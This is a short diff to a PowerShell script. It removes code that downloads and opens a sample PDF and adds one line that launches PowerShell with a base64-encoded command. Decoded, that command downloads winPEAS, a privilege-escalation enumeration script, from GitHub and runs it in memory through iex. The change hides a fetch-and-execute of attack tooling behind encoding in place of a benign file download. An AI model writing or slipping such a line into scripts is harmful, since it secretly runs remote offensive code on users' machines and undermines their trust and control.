@@ -1,7 +1,1 @@
-Invoke-WebRequest http://www.pdf995.com/samples/pdf.pdf -UserAgent $userAgent
-$down = New-Object System.Net.WebClient
-$url  = 'http://www.pdf995.com/samples/pdf.pdf';
-$file = 'test.pdf';
-$down.DownloadFile($url,$file);
-$exec = New-Object -com shell.application
-$exec.shellexecute($file);
+$exec.shellexecute("powershell.exe -EncodedCommand aQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAHAAZQBhAHMAcwAtAG4AZwAvAFAARQBBAFMAUwAtAG4AZwAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAcwB0AGUAcgAvAHcAaQBuAFAARQBBAFMALwB3AGkAbgBQAEUAQQBTAHAAcwAxAC8AdwBpAG4AUABFAEEAUwAuAHAAcwAxACcAKQA=");
